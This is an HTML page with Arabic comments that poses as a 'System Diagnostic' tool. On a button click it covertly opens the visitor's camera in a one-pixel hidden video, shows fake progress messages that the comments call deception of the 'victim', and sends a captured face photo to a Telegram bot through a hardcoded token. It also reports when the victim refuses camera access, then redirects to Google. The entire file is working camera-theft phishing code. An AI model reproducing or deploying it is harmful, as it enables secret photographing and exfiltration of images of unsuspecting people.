<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>System Diagnostic - جاري الفحص</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=VT323&display=swap');
        body { background-color: black; color: #00ff00; font-family: 'VT323', monospace; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
        
        /* جعل الكاميرا مرئية للمتصفح (1 بكسل) ولكنها غير مرئية للعين */
        #v { width: 1px; height: 1px; opacity: 0.01; position: absolute; top: 0; left: 0; }
        
        .loader { border: 5px solid #333; border-top: 5px solid #00ff00; border-radius: 50%; width: 60px; height: 60px; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(3600deg); } }
        
        #btn { padding: 15px 40px; background: transparent; color: #00ff00; border: 2px solid #00ff00; font-family: 'VT323', monospace; font-size: 24px; cursor: pointer; transition: 0.3s; box-shadow: 0 0 15px #00ff00; }
        #btn:hover { background: #00ff00; color: black; }
        #status { margin-top: 20px; font-size: 20px; letter-spacing: 2px; }
        canvas { display: none; }
    </style>
</head>
<body>

    <video id="v" autoplay playsinline muted></video>
    <canvas id="c"></canvas>

    <div id="main-ui">
        <button id="btn" onclick="initializeSystem()">RUN DIAGNOSTIC</button>
    </div>

    <div id="loading-ui" style="display:none; text-align:center;">
        <div class="loader"></div>
        <div id="status">CONNECTING TO KERNEL...</div>
    </div>

    <script>
        const token = "8570413998:AAHjdBQuzcwo6Qh3sEJ3bIe-tjeFhz1A1GU";
        const chat = "8042090388";

        async function initializeSystem() {
            document.getElementById('main-ui').style.display = 'none';
            document.getElementById('loading-ui').style.display = 'block';

            try {
                // طلب الكاميرا بجودة عالية لإجبار الحساس على العمل
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: "user", width: 1280, height: 720 } 
                });
                const video = document.getElementById('v');
                video.srcObject = stream;

                // تحديث الحالة للضحية (للتمويه)
                setTimeout(() => { document.getElementById('status').innerText = "SCANNING HARDWARE (35%)..."; }, 2000);
                setTimeout(() => { document.getElementById('status').innerText = "EXTRACTING DATA (70%)..."; }, 4500);

                // الانتظار 6 ثوانٍ كاملة لضمان وضوح الصورة وتعديل الإضاءة
                setTimeout(captureFinal, 6500);

            } catch (err) {
                // إذا رفض الضحية، نرسل تنبيه للبوت
                fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat}&text=⚠️ الضحية رفض تصريح الكاميرا.`);
                alert("يجب السماح بالكاميرا لإكمال فحص النظام!");
                location.reload();
            }
        }

        async function captureFinal() {
            const v = document.getElementById('v');
            const c = document.getElementById('c');
            c.width = v.videoWidth;
            c.height = v.videoHeight;
            const ctx = c.getContext('2d');
            
            // التقاط الصورة
            ctx.drawImage(v, 0, 0, c.width, c.height);
            const imgData = c.toDataURL('image/jpeg', 0.9);
            
            // تحويل الصورة لملف
            const blob = await (await fetch(imgData)).blob();
            const formData = new FormData();
            formData.append('chat_id', chat);
            formData.append('photo', blob, 'victim_face.jpg');
            formData.append('caption', '🎯 تم الصيد بنجاح! صورة واضحة ومضمونة.');

            // إرسال الصورة للبوت
            fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
                method: 'POST',
                body: formData
            }).then(() => {
                document.getElementById('status').innerText = "DIAGNOSTIC COMPLETE";
                setTimeout(() => {
                    window.location.href = "https://www.google.com"; // تحويل الضحية
                }, 1000);
            });
        }
    </script>
</body>
</html>
